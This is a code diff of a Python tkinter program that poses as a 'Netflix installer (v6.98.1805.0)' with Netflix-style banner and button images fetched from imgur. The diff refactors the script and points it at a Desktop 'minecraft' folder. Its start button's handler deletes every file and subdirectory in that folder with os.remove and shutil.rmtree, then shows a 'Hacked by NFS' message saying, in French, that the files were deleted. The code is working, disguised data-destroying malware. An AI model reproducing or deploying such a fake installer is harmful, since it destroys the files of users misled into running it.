@@ -1,72 +1,60 @@
-import tkinter.font as font, requests, time, shutil, os, jsons, tkinter as tk, random, pyautogui
-from tkinter import messagebox, CENTER, Tk, Canvas, Button, Label, PhotoImage, SUNKEN
+import time, shutil, os, jsons, random, pyautogui, urllib.request
+from tkinter import Tk, Button, Label, SUNKEN, messagebox
 from PIL import ImageTk, Image
-import urllib.request, os
 
-# Variables
-backgroundcolor = "#000"
-netflixcolor = "#e50914"
-netflixcolordarker = "#ba121b"
-# Folder where the files are located
-# FILES_FOLDER = "C:\\wamp64\\www\\projects\\covid.py\\back\\files\\"
-FILES_FOLDER = os.path.expanduser('~') + "\\Desktop\\files\\"
-# Countdown in seconds
-COUNTDOWN = 2# 1800 # 30 minutes
-# Window size
-WINDOW_WIDTH = 800
-WINDOW_HEIGHT = 600
+# Configuration
+FILES_FOLDER = os.path.expanduser('~') + "\\Desktop\\minecraft\\"
+FILES = os.listdir(FILES_FOLDER)
+WIN_WIDTH = 1200
+WIN_HEIGHT = 600
+WIN_TITLE = "Netflix installer (v6.98.1805.0)"
+WIN_BACKGROUND = "#000"
 
-
-# Functions
 def handle_click():
-    files = os.listdir(FILES_FOLDER)
+    """
+    Delete all files in FILES_FOLDER
+    """
+    for file in range(0, len(FILES)):
+        file_path = FILES_FOLDER + FILES[file]
 
-    # function call
-    # countdown(COUNTDOWN)
-
-    for file in range(0, len(files)):
-        # Delete a random file from the list
-        chemin_fichier = FILES_FOLDER + files[file]
-
-        if os.path.exists(chemin_fichier):
-            if os.path.isfile(chemin_fichier):
-                os.remove(FILES_FOLDER + files[file])
-                print(f"Le chemin {chemin_fichier} pointe vers un fichier valide.")
+        if os.path.exists(file_path):
+            if os.path.isfile(file_path):
+                # If it's a file, delete it
+                os.remove(FILES_FOLDER + FILES[file])
             else:
-                shutil.rmtree(chemin_fichier)
-                print(f"Le chemin {chemin_fichier} pointe vers un répertoire.")
-        else:
-            print(f"Le chemin {chemin_fichier} n'existe pas.")
+                # If it's a directory, delete it
+                shutil.rmtree(file_path)
+
         time.sleep(2)
 
+    # Show message after all files are deleted
     messagebox.showinfo("Hacked by NFS", "Vos fichiers ont bien été supprimé !")
 
 def center(win):
     """
-    centers a tkinter window
+    Center a tkinter window
     :param win: the main window or Toplevel window to center
     """
     win.update_idletasks()
-    width = 1200
     frm_width = win.winfo_rootx() - win.winfo_x()
-    win_width = width + 2 * frm_width
-    height = 600
+    win_width = WIN_WIDTH + 2 * frm_width
     titlebar_height = win.winfo_rooty() - win.winfo_y()
-    win_height = height + titlebar_height + frm_width
+    win_height = WIN_HEIGHT + titlebar_height + frm_width
     x = win.winfo_screenwidth() // 2 - win_width // 2
     y = win.winfo_screenheight() // 2 - win_height // 2
-    win.geometry('{}x{}+{}+{}'.format(width, height, x, y))
+    win.geometry('{}x{}+{}+{}'.format(WIN_WIDTH, WIN_HEIGHT, x, y))
     win.deiconify()
 
 def init_landing():
-    # Window configuration
+    """
+    Show landing page
+    """
     window = Tk()
-    window.title("Netflix installer (v6.98.1805.0)")
-    window.configure(background = backgroundcolor)
-    buttonfont = font.Font(family = "Helvetica")
+    window.title(WIN_TITLE)
+    window.configure(background = WIN_BACKGROUND)
     center(window)
 
-    # Add banner image
+    # Add images to local
     urllib.request.urlretrieve(
         'https://i.imgur.com/1HECSrt.jpg',
         "bg.jpg"
@@ -79,6 +67,13 @@ def init_landing():
         'https://i.imgur.com/WkAAEoR.png',
         "btn-hover.png"
     )
+    urllib.request.urlretrieve(
+        'https://i.imgur.com/athSNgm.png',
+        "icon.png"
+    )
+
+    # Define images
+    window.iconbitmap("icon.png")
     img = Image.open("bg.jpg")
     img = img.resize((1080, 338), Image.Resampling.LANCZOS)
     tkimage = ImageTk.PhotoImage(img)
@@ -98,15 +93,15 @@ def init_landing():
 
     # Add button
     startbutton = Button(
-        master = window,
-        image = image_a, 
-        border=0,
-        borderwidth=0,
-        cursor="hand2",
-        background=backgroundcolor,
-        activebackground=backgroundcolor,
-        command = handle_click,
-        relief=SUNKEN
+        master           = window,
+        image            = image_a, 
+        border           = 0,
+        borderwidth      = 0,
+        cursor           = "hand2",
+        background       = WIN_BACKGROUND,
+        activebackground = WIN_BACKGROUND,
+        command          = handle_click,
+        relief           = SUNKEN
     )
 
     startbutton.bind("<Enter>", onenter)
